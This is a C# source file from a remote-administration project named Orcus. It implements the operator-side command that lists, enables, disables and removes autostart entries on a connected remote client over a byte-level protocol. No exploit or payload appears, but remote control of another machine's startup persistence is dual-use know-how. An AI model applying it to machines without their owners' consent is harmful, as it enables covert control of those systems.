using System;
using System.Collections.Generic;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.StartupManager;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.StartupManager
{
    [DescribeCommandByEnum(typeof (StartupManagerCommunication))]
    public class StartupManagerCommand : Command
    {
        public event EventHandler<List<AutostartProgramInfo>> AutostartEntriesReceived;
        public event EventHandler<EntryChangedEventArgs> AutostartEntryEnabled;
        public event EventHandler<EntryChangedEventArgs> AutostartEntryDisabled;
        public event EventHandler<EntryChangedEventArgs> AutostartEntryRemoved;
        public event EventHandler<EntryChangedEventArgs> ChangingAutostartEntryFailed;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((StartupManagerCommunication) parameter[0])
            {
                case StartupManagerCommunication.ResponseAutostartEntries:
                    var autostartEntries =
                        new Serializer(typeof (List<AutostartProgramInfo>)).Deserialize<List<AutostartProgramInfo>>(
                            parameter, 1);
                    AutostartEntriesReceived?.Invoke(this, autostartEntries);
                    LogService.Receive(string.Format(
                        (string) Application.Current.Resources["AutostartProgramsReceived"], autostartEntries.Count));
                    break;
                case StartupManagerCommunication.ResponseAutostartEntryEnabled:
                    AutostartEntryEnabled?.Invoke(this,
                        new EntryChangedEventArgs(Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2),
                            (AutostartLocation) parameter[1], false));
                        //This is to identify the existing entry which should still be disabled
                    LogService.Receive((string) Application.Current.Resources["EnableAutostartEntrySuccessful"]);
                    break;
                case StartupManagerCommunication.ResponseAutostartEntryDisabled:
                    AutostartEntryDisabled?.Invoke(this,
                        new EntryChangedEventArgs(Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2),
                            (AutostartLocation) parameter[1], true));
                    LogService.Receive((string) Application.Current.Resources["DisableAutostartEntrySuccessful"]);
                    break;
                case StartupManagerCommunication.ResponseAutostartEntryRemoved:
                    AutostartEntryRemoved?.Invoke(this,
                        new EntryChangedEventArgs(Encoding.UTF8.GetString(parameter, 3, parameter.Length - 3),
                            (AutostartLocation) parameter[2], parameter[1] == 1));
                    LogService.Receive((string) Application.Current.Resources["AutostartEntryRemoved"]);
                    break;
                case StartupManagerCommunication.ResponseAutostartChangingFailed:
                    ChangingAutostartEntryFailed?.Invoke(this,
                        new EntryChangedEventArgs(Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2),
                            (AutostartLocation) parameter[1], true));
                    LogService.Error((string) Application.Current.Resources["UnauthorizedAccess"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetAutostartEntries()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) StartupManagerCommunication.GetAutostartEntries});
            LogService.Send((string) Application.Current.Resources["GetAutostartEntries"]);
        }

        public void ChangeAutostartEntry(AutostartProgramInfo autostartProgramInfo, bool enable)
        {
            var nameData = Encoding.UTF8.GetBytes(autostartProgramInfo.Name);
            var data = new byte[nameData.Length + 2];
            data[0] =
                (byte)
                    (enable
                        ? StartupManagerCommunication.EnableAutostartEntry
                        : StartupManagerCommunication.DisableAutostartEntry);
            data[1] = (byte) autostartProgramInfo.AutostartLocation;
            Array.Copy(nameData, 0, data, 2, nameData.Length);
            ConnectionInfo.SendCommand(this, data);
            LogService.Send(
                string.Format(
                    enable
                        ? (string) Application.Current.Resources["EnableAutostartEntry"]
                        : (string) Application.Current.Resources["DisableAutostartEntry"], autostartProgramInfo.Name));
        }

        public void RemoveAutostartEntry(AutostartProgramInfo autostartProgramInfo)
        {
            var nameData = Encoding.UTF8.GetBytes(autostartProgramInfo.Name);
            var data = new byte[nameData.Length + 3];
            data[0] = (byte) StartupManagerCommunication.RemoveAutostartEntry;
            data[1] = (byte) (autostartProgramInfo.IsEnabled ? 1 : 0);
            data[2] = (byte) autostartProgramInfo.AutostartLocation;
            Array.Copy(nameData, 0, data, 3, nameData.Length);
            ConnectionInfo.SendCommand(this, data);
            LogService.Send(string.Format((string) Application.Current.Resources["RemoveAutostartEntry"],
                autostartProgramInfo.Name));
        }

        protected override uint GetId()
        {
            return 25;
        }
    }
}